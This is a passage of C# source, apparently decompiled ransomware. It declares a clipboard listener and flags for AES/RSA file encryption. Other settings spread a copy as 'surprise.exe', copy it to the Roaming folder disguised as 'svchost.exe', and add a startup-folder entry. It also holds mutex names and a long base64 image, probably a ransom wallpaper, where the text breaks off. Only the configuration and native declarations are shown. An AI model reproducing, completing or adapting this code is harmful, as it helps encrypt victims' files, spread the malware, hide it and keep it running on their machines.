using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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